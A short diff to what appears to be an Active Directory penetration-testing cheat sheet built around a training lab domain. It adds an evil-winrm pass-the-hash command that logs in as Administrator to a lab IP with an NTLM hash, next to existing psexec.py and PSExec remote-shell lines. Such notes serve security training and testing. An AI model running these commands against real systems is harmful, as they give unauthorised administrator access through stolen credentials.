@@ -261,6 +261,10 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 `psexec.py -hashes :32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
 
+or using evil-winrm
+
+`evil-winrm -i 10.10.43.76 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`
+
 PSexec can also be yused from windows client
 
 `.\PSExec.exe \\dc1.domain.com cmd`
